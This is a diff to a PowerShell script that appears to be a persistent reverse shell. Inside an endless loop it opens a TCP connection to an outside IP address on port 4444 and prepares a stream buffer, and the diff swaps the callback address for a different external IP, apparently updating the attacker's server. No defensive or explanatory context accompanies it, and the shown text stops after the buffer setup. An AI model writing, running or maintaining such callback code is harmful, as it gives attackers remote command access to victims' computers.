@@ -1,7 +1,7 @@
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient
-        $client.Connect("31.57.46.127", 4444)
+        $client.Connect("45.154.3.68", 4444)
         if ($client.Connected) {
             $stream = $client.GetStream()
             [byte[]]$bytes = 0..65535 | % {0}
